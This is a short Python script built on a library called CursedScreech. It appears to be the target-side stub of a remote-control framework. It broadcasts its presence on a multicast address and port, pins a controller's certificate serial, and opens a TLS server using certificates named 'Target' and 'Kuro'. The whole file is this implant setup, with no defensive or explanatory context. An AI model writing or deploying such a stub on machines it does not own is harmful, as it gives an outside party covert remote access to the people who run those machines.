from CursedScreech import CursedScreech

cs = CursedScreech("Network Client")
cs.startMulticaster("231.253.78.30", 19579)
cs.setRemoteCertificateSerial("ABADBA8FB7042269")
cs.startSecureServerThread("Target.pem", "Target.cer", "Kuro.cer")
